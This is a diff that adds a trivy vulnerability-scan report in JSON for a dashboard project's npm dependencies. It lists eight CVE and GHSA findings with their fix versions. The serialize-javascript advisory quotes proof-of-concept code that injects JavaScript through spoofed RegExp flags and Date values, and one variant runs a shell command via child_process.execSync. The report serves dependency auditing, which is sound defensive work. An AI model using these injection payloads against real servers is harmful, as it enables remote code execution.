@@ -1,0 +1,116 @@
+{
+  "summary": {
+    "CRITICAL": 0,
+    "HIGH": 4,
+    "MEDIUM": 3,
+    "LOW": 1,
+    "INFO": 0
+  },
+  "passed_gate": true,
+  "findings": [
+    {
+      "scanner": "trivy",
+      "severity": "LOW",
+      "title": "@tootallnate/once - CVE-2026-3449",
+      "description": "Versions of the package @tootallnate/once before 3.0.1 are vulnerable to Incorrect Control Flow Scoping in promise resolving when AbortSignal option is used. The Promise remains in a permanently pending state after the signal is aborted, causing any await or .then() usage to hang indefinitely. This can cause a control-flow leak that can lead to stalled requests, blocked workers, or degraded application availability.",
+      "file_path": "dashboard/package-lock.json",
+      "line_number": null,
+      "rule_id": "CVE-2026-3449",
+      "cve": "CVE-2026-3449",
+      "remediation": "Fix version: 3.0.1",
+      "url": null,
+      "fingerprint": "5de37ee7f7ffd7a314b5e138b02f97a8"
+    },
+    {
+      "scanner": "trivy",
+      "severity": "HIGH",
+      "title": "jsonpath - CVE-2026-1615",
+      "description": "Versions of the package jsonpath before 1.2.0 are vulnerable to Arbitrary Code Injection via unsafe evaluation of user-supplied JSON Path expressions. The library relies on the static-eval module to process JSON Path input, which is not designed to handle untrusted data safely. An attacker can exploit this vulnerability by supplying a malicious JSON Path expression that, when evaluated, executes arbitrary JavaScript code, leading to Remote Code Execution in Node.js environments or Cross-site Scripting (XSS) in browser contexts. This affects all methods that evaluate JSON Paths against objects, including .query, .nodes, .paths, .value, .parent, and .apply.",
+      "file_path": "dashboard/package-lock.json",
+      "line_number": null,
+      "rule_id": "CVE-2026-1615",
+      "cve": "CVE-2026-1615",
+      "remediation": "Fix version: No fix available",
+      "url": null,
+      "fingerprint": "67ba3c616b698e12187edbca8b910bc0"
+    },
+    {
+      "scanner": "trivy",
+      "severity": "HIGH",
+      "title": "nth-check - CVE-2021-3803",
+      "description": "nth-check is vulnerable to Inefficient Regular Expression Complexity",
+      "file_path": "dashboard/package-lock.json",
+      "line_number": null,
+      "rule_id": "CVE-2021-3803",
+      "cve": "CVE-2021-3803",
+      "remediation": "Fix version: 2.0.1",
+      "url": null,
+      "fingerprint": "bf7f0420fee171b1b343eaa3b62b591f"
+    },
+    {
+      "scanner": "trivy",
+      "severity": "MEDIUM",
+      "title": "postcss - CVE-2023-44270",
+      "description": "An issue was discovered in PostCSS before 8.4.31. The vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being included in a comment.",
+      "file_path": "dashboard/package-lock.json",
+      "line_number": null,
+      "rule_id": "CVE-2023-44270",
+      "cve": "CVE-2023-44270",
+      "remediation": "Fix version: 8.4.31",
+      "url": null,
+      "fingerprint": "2e97dd8b6b0222bf19d30fb0bab3e08a"
+    },
+    {
+      "scanner": "trivy",
+      "severity": "HIGH",
+      "title": "serialize-javascript - GHSA-5c6j-r48x-rmvq",
+      "description": "### Impact\n\nThe serialize-javascript npm package (versions <= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.\n\nWhile `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.\n\nIf an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `<script>` tags), the injected code executes.\n\n```javascript\nconst serialize = require('serialize-javascript');\n// Create an object that passes instanceof RegExp with a spoofed .flags\nconst fakeRegex = Object.create(RegExp.prototype);\nObject.defineProperty(fakeRegex, 'source', { get: () => 'x' });\nObject.defineProperty(fakeRegex, 'flags', {\n  get: () => '\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"'\n});\nfakeRegex.toJSON = function() { return '@placeholder'; };\nconst output = serialize({ re: fakeRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"\")}\nlet obj;\neval('obj = ' + output);\nconsole.log(global.PWNED); // \"CODE_INJECTION_VIA_FLAGS\" \u00e2\u20ac\u201d injected code executed!\n#h2. PoC 2: Code Injection via Date.toISOString()\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst fakeDate = Object.create(Date.prototype);\nfakeDate.toISOString = function() { return '\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"'; };\nfakeDate.toJSON = function() { return '2024-01-01'; };\nconst output = serialize({ d: fakeDate });\n// Output: {\"d\":new Date(\"\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"\")}\neval('obj = ' + output);\nconsole.log(global.DATE_PWNED); // \"DATE_INJECTION\" \u00e2\u20ac\u201d injected code executed!\n#h2. PoC 3: Remote Code Execution\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst rceRegex = Object.create(RegExp.prototype);\nObject.defineProperty(rceRegex, 'source', { get: () => 'x' });\nObject.defineProperty(rceRegex, 'flags', {\n  get: () => '\"+require(\"child_process\").execSync(\"id\").toString()+\"'\n});\nrceRegex.toJSON = function() { return '@rce'; };\nconst output = serialize({ re: rceRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+require(\"child_process\").execSync(\"id\").toString()+\"\")}\n// When eval'd on a Node.js server, executes the \"id\" system command\n```\n\n### Patches\n\nThe fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3",
+      "file_path": "dashboard/package-lock.json",
+      "line_number": null,
+      "rule_id": "GHSA-5c6j-r48x-rmvq",
+      "cve": null,
+      "remediation": "Fix version: 7.0.3",
+      "url": null,
+      "fingerprint": "f600d874780861a0e65bdc3306fbeab1"
+    },
+    {
+      "scanner": "trivy",
+      "severity": "HIGH",
+      "title": "underscore - CVE-2026-27601",
+      "description": "Underscore.js is a utility-belt library for JavaScript. Prior to 1.13.8, the _.flatten and _.isEqual functions use recursion without a depth limit. Under very specific conditions, detailed below, an attacker could exploit this in a Denial of Service (DoS) attack by triggering a stack overflow. Untrusted input must be used to create a recursive datastructure, for example using JSON.parse, with no enforced depth limit. The datastructure thus created must be passed to _.flatten or _.isEqual. In the case of _.flatten, the vulnerability can only be exploited if it is possible for a remote client to prepare a datastructure that consists of arrays at all levels AND if no finite depth limit is passed as the second argument to _.flatten. In the case of _.isEqual, the vulnerability can only be exploited if there exists a code path in which two distinct datastructures that were submitted by the same remote client are compared using _.isEqual. For example, if a client submits data that are stored in a database, and the same client can later submit another datastructure that is then compared to the data that were saved in the database previously, OR if a client submits a single request, but its data are parsed twice, creating two non-identical but equivalent datastructures that are then compared. Exceptions originating from the call to _.flatten or _.isEqual, as a result of a stack overflow, are not being caught. This vulnerability is fixed in 1.13.8.",
+      "file_path": "dashboard/package-lock.json",
+      "line_number": null,
+      "rule_id": "CVE-2026-27601",
+      "cve": "CVE-2026-27601",
+      "remediation": "Fix version: 1.13.8",
+      "url": null,
+      "fingerprint": "a629c8897094c478ffbe2e3f9fe378e2"
+    },
+    {
+      "scanner": "trivy",
+      "severity": "MEDIUM",
+      "title": "webpack-dev-server - CVE-2025-30359",
+      "description": "webpack-dev-server allows users to use webpack with a development server that provides live reloading. Prior to version 5.2.1, webpack-dev-server users' source code may be stolen when they access a malicious web site. Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject a malicious script in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables. By using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code. Version 5.2.1 contains a patch for the issue.",
+      "file_path": "dashboard/package-lock.json",
+      "line_number": null,
+      "rule_id": "CVE-2025-30359",
+      "cve": "CVE-2025-30359",
+      "remediation": "Fix version: 5.2.1",
+      "url": null,
+      "fingerprint": "206586ac1dcc104339455a22c7781a8f"
+    },
+    {
+      "scanner": "trivy",
+      "severity": "MEDIUM",
+      "title": "webpack-dev-server - CVE-2025-30360",
+      "description": "webpack-dev-server allows users to use webpack with a development server that provides live reloading. Prior to version 5.2.1, webpack-dev-server users' source code may be stolen when you access a malicious web site with non-Chromium based browser. The `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening, which was reported by CVE-2018-14732. But webpack-dev-server always allows IP address `Origin` headers. This allows websites that are served on IP addresses to connect WebSocket. An attacker can obtain source code via a method similar to that used to exploit CVE-2018-14732. Version 5.2.1 contains a patch for the issue.",
+      "file_path": "dashboard/package-lock.json",
+      "line_number": null,
+      "rule_id": "CVE-2025-30360",
+      "cve": "CVE-2025-30360",
+      "remediation": "Fix version: 5.2.1",
+      "url": null,
+      "fingerprint": "8fa81493142e64fed0b12c31cd312093"
+    }
+  ]
+}
